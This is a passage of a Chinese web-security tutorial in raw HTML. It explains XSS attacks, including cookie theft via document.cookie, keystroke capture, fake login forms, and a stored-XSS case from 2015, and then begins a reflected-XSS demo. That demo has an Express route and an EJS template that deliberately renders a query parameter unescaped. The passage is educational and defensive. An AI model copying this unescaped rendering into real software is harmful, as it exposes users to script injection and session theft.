来限制其自由程度。</li>\n<li>使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li>\n<li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信</li>\n</ul>\n<h1 id="跨站脚本攻击-xss：为什么-cookie-中有-httponly-属性"><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-cookie-%E4%B8%AD%E6%9C%89-httponly-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>跨站脚本攻击 XSS：为什么 cookie 中有 httpOnly 属性</h1>\n<p>通过上篇文章的介绍，我们知道了同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。</p>\n<p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。</p>\n<h2 id="什么是-xss-攻击"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 XSS 攻击</h2>\n<p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p>\n<p>最开始的时候，这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。</p>\n<p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。下面我们就来看看，如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情</p>\n<ul>\n<li>可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li>\n<li>可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li>\n<li>可以通过修改 DOM 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li>\n<li>还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。</li>\n</ul>\n<p>除了以上几种情况外，恶意脚本还能做很多其他的事情，这里就不一一介绍了。总之，如果让页面插入了恶意脚本，那么就相当于把我们页面的隐私数据和行为完全暴露给黑客了。</p>\n<h2 id="恶意脚本是怎么注入的"><a href="#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%98%AF%E6%80%8E%E4%B9%88%E6%B3%A8%E5%85%A5%E7%9A%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>恶意脚本是怎么注入的</h2>\n<p>现在我们知道了页面中被注入恶意的 JavaScript 脚本是一件非常危险的事情，所以网站开发者会尽可能地避免页面中被注入恶意脚本。要想避免站点被注入恶意脚本，就要知道有哪些常见的注入方式。通常情况下，主要有存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击三种方式来注入恶意脚本。</p>\n<h3 id="存储型-xss-攻击"><a href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>存储型 XSS 攻击</h3>\n<p>我们先来看看存储型 XSS 攻击是怎么向 HTML 文件中注入恶意脚本的，你可以参考下图</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-43c12.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 78.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACK0lEQVQoz5WTXWvTUBjH9z38Al75JcQpztKWbnjhCjrmdBvM4bUgeOGdF/oBxAsplnph1/qytUU73CyCzNIW0k2xSZssSZOTl56cpHn1yULXIvXtfxEezsnvefmfc2ayufzr8qfsq53mwdfAIh7WvYHuYz1w7CDwgz9q5szZ84t3H5+bXX3w8EngO+IxjzVNEgW515XoDoJAlg1CBEG0h0MA/JFCeGXzfubl2817jzK5gue7kiwPBhi+iqqpCpI5lvt2iI45tssMR/C4MjEwkmVdU52wz+nyLTMwDcIye9VqdXf3ffVDt9cL4eAfFFWzTHPp5nIskbgcn8sXt0IYGV6PRSwaOq5n27Z1IkKIYRjmSLDu2DbMcnttLbUwH0vGt4qFEP7Bk6M37yiKY/tKXxRomm63241Go16vUxTVarWazSZ4JkkSz/PrdzYSqVRsPrlTKYWwYniiMuwIg76EoDEwFhQVPA2i2HPdWq1WKpdLlTLN0OOZXcfWQs+c0yEjeSdyXTca2xnJtKwQhsVoA/5QVVXTNGiPYRiIoVUBzlcUOY6zQ4J8rpT2S9t728XeETXFbUgBVum6rigKJCIjwRYW+Rvpa+D27KULuWdPf4UnL0CUKCIxxjrG35uNleWlq+nFxEIyn8383zmTvnjrejqeiF+Zu1h48fzv8ORN9hybPvhyWNunPlYVuhMZNkVT+VAGDogBb86D4HeV4Q0ghCLnYPJxIqg/8VB/AtrWZAR38QhkAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 25 20"\n        title=""\n        src="/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-fee1c.png"\n        srcset="/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-a67b7.png 200w,\n/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-0b187.png 400w,\n/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-fee1c.png 800w,\n/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-b1a91.png 1200w,\n/static/2021-07-15-14-25-20-dd7f57917cdfa988225465c096204d5f-43c12.png 1500w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上图，我们可以看出存储型 XSS 攻击大致需要经过如下步骤：</p>\n<ul>\n<li>首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li>\n<li>然后用户向网站请求包含了恶意 JavaScript 脚本的页面；</li>\n<li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。</li>\n</ul>\n<p>下面我们来看个例子，2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 80.99824868651488%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACZklEQVQoz41SzWsTQRTfKtKLF62iB4V68I8IIvTYo4h4LfhRRBEEBS05i1ClxV78uHjw41KkUky6UFrrR0lsssm2wWytTZuStUk/sp+zHzOzM+PsblsSPdQ3Px7De/N7vzePJ1gjvfrzi/bTXuP1NXOoBzzo3rx0MOgTyNUO2i949095ydPo1iGQ7Cb9nej6AfvuMXy707t3HN48LMDMW3/2DZwbhfn38NsrNDlCxMdYfIInBvHMC5R9h2ee2eOPtPFB68NDDkccRpND8OtLIA4LkLAdBKH3KfMY8xmDMUjoDY82ATF8akLKH2DGEGMAMyHwIYEohI9IQBg3yhihhMfjlA8pRAxh7inCO/EoKBBM4tecBWpKUcoV5+crlRW2r1HWRnbXf1VKheXyQm15MQBGAMwQTgjiWvGFR5Clc2DoROSISX7XtdnMZj7vKwqprJiyrEmSVig0pTxHI5ttShK/6MUCXPrplRZcudhCrqlbqXRVFO1sBsvy2kR6aWysmk6tpj6uT02tieLG9Kf69NTWl8+4VPJzc9737G7be+AWEMpHghCNUtD1aBBEn4zSXAnjEJS2kPmfXa+p6ZgnGFPKZTmXlaWc47oRhbbWbxsYjTo3dH21WvV9n0d6ziW6BOHsyaPlH0pIDtobpK3T3q0ZCYS1zicSRzqEMye6FGXx/8iUERLuCSE0OTDQd/nCnRtX1Joal9ufvPcfiqFmGBYA0IMA2K7jWIZlmzawAOILx/4h09CiDSUMIQhReHjDXLYVfyvHA2vU69r2dqzdqG84jsP758qqquqGEe6vDUzd1Jt6zPoDrCxcgsKIbNgAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 25 47"\n        title=""\n        src="/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-fee1c.png"\n        srcset="/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-a67b7.png 200w,\n/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-0b187.png 400w,\n/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-fee1c.png 800w,\n/static/2021-07-15-14-25-47-b90ef1ee50e11f4a093e56398dde829f-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-457a0.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 95.50561797752809%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC2ElEQVQ4y4VTW08TQRReEqwYTCAqAQnGyIMXUBGj+OKzf0wfNYRgTPwHxnA3wINEkagJ0BstvbDtbne327203bZ7me3Mzl6ctkQBqZ6cnJw5831nZs45QwVt8X2f2Fq9Go6G44lYLB7TalrwP6FOLgAAgsAXi7xcEhRFbjQaJCl2XeQ4sK3EIcuzZLcdWv+0dmtkYHp85MXUzZnxq8+ePHUQMmxQM3UAoQltzWiYAJxPXllavEBRQ30908P9Y5d7Ju/eQwiZTRti7Pk+xE7dMi27C3l1ZamXoq5dCk1cH+zvpaYfPoAI2ggijI0mIA7J0pW8tLAQoqjbQ/3P74zeGAzdn5jonKwD0/FaAACbXa+9vLZ2sS80NnJlanx4cnRg5vEjQrYI2baaDgKdN/99su95xIobm1svX0W+fkkcJuhkLJtOkThoQlFRdACQ65Jr4zbydKvafYZ7+863ncA0fkcCP4AOtgBwMD6nzwTTmZCOeI7Tofme72I3+LMTtJEk3srYUerkhBmGnopGcpkUx3OGrp/gdZmwugEauqVbpIxIrVTT0VhqL5xhOVEpGzYkcQM0yYi0ADYiGGINAFsOQFScFg/o4l6STbNSOs+onJhP0qlSLcUqUVqIs1Iky8dzpUhGYMuAKVtsSwGxjGpRqVzhMFdQG80sKySy+fhhjt/5GU0eHWTZZJpmGIERFU6qCLKWYXmaK+YEiVeqR5yYYfjjgnmeTwZIrWiioinb31W+qAqlqlAEluW3hQDa1WrZY79VbeJ5fqck5BtIlZr8Y7eUyuqyaJRKDnb++SX94IT6MAjU3bC0ta1oer2saapmyQpQylCrW3LZrNQchF3HxQg3Hfc0OQgwQiB5sLkefve5MLsYm12IzH6IzH8Mv1/ef7uSebPEzq0XX6+w86vM3EbxLNmzbVxRG9V6ISNkE+kCzfAMx9J5JsdIgiwJJUmQ2FxBYjhTVn8B/YztTtVZfV4AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 26 05"\n        title=""\n        src="/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-fee1c.png"\n        srcset="/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-a67b7.png 200w,\n/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-0b187.png 400w,\n/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-fee1c.png 800w,\n/static/2021-07-15-14-26-05-f000b44ab30f83c192c391ae1b7b6ae8-457a0.png 1068w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。</p>\n<p>恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 90.19264448336251%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABm0lEQVQ4y5WUbXOjIBSF8///XxUUBG2iEaOpvJpt1D2Yabeza3fSMwwfwIdzOV49hDD1OqhODddhXVcffF3Xl667Qm9vfd9jZRzHy+WyLURpPbZX56dfhyVqDSHcbjfA1pjkJSkKASzyw9WH0ClVn05Ng+kkpcD8/n6/z/Nh/dQSJ2dtVVXH40kpBbf2fA7et23Lcs45q5tGqW4Y+nnT37B3XghRypIXEM8yarTBKTlj56ax1o6jsdbhyR14CiGjNI4sIySlhACAM2ydc3rUqlXDMOzDwYeUpBnN8g9prePmsqxftazz/d+yfcizDAUXopBlSSl9wKDxQAx3jmMfRjyM5WUpEdvr8RUpWWPj5gZ8HbtwdEZmMIcQ2H7Zu3f2zhFCkC2ECydpgs74EZwyxgEj8yR5eWT7FIw7U0qKItKoPE2TJ+Hl4YyE0R+4LQ7AQcaYZ52nMG2dGMvOt8rtT+CAahG2lBIH8IKjw/5s/x++TVOFtywkeI4aGNParHv6trfLEi0CVfBHSz8Lo0kKIfBJgsRfAZ+u+d75N53sBDkL8MGlAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 26 30"\n        title=""\n        src="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-fee1c.png"\n        srcset="/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-a67b7.png 200w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-0b187.png 400w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-fee1c.png 800w,\n/static/2021-07-15-14-26-30-da03b9cc2934fc163b21b1b7a1be7b40-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-6f7a7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 64.15620641562064%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB2ElEQVQoz3VR70/TQBjuv2v4UzDGODV+8IMfQBLYSuIWURaITGEmBpFIlgBzYLe1W3vtde31frV3823PMSf65ul7Ty/vc+8vi3w/8DsbwecG6u6M7Zpff4jePA7evwjePQ9az6bNJ/7bmt+qTZu1kreehruPkL2OurbfO7FI/ys+a0cXnfBs3+800Ift8MSOvjRHh6+H7Q33cAt1dyef6n5nJziuB8cNZ++Ve7A5Pd0fnx9ZSimcMlno+arpCvdNLe6BWHAM+v2ry8u50iRJ4wjnIs9lXkjwsgBwkQuR8wWEzLmEmELqUmxv19cerDGScS5wFEkhOeeMMV4dnPGieusOuSwEzzlNS3FGSP/6h6lqNovdiRfhWAguhaCUUS7uF59LxbKJNVeK4JAybm4JSRHGKE4gpbiTKV1Cz5eorMycQqs4NkE0yyilaZpGkB3HWuk/MdeGmCeqnhllGcl+j/g/pk3m1WWYnrMkSUwE8NFo5HkurBBGff3t1PnpRGFkJM7N+e3gCooyegu+RUklmeGZ63pj100p1YK3N19e9HrQgEn78Wjv9mYgpVxm/ssKpbksl2J+YaOFUv/sZUUM4wAPqx4OHfAYY9fzgHuehxAqhwU16mXrvwAiZ9psInDk4wAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 26 42"\n        title=""\n        src="/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-fee1c.png"\n        srcset="/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-a67b7.png 200w,\n/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-0b187.png 400w,\n/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-fee1c.png 800w,\n/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-b1a91.png 1200w,\n/static/2021-07-15-14-26-42-3db58213b8e975f5863703ef8a1d0a05-6f7a7.png 1434w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>以上就是存储型 XSS 攻击的一个典型案例，这是乌云网在 2015 年曝出来的，虽然乌云网由于某些原因被关停了。</p>\n<h3 id="反射型-xss-攻击"><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>反射型 XSS 攻击</h3>\n<p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。</p>\n<p>这样讲有点抽象，下面我们结合一个简单的 Node 服务程序来看看什么是反射型 XSS。首先我们使用 Node 来搭建一个简单的页面环境，搭建好的服务代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="60802385049038920000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`var express = require(\'express\');\nvar router = express.Router();\n\n/* GET home page. */\nrouter.get(\'/\', function(req, res, next) {\n  res.render(\'index\', { title: \'Express\', xss: req.query.xss });\n});\n\nmodule.exports = router;`, `60802385049038920000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">\'express\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">/* GET home page. */</span>\nrouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">\'/\'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">\'index\'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">\'Express\'</span><span class="token punctuation">,</span> xss<span class="token punctuation">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>xss <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="4660838607254348000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <head>\n    <title><%= title %></title>\n    <link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/style.css&quot; />\n  </head>\n  <body>\n    <h1><%= title %></h1>\n    <p>Welcome to <%= title %></p>\n    <div>\n      <%- xss %>\n    </div>\n  </body>\n</html>`, `4660838607254348000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>&lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/stylesheets/style.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>&lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Welcome to &lt;%= title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n      &lt;%- xss %>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token 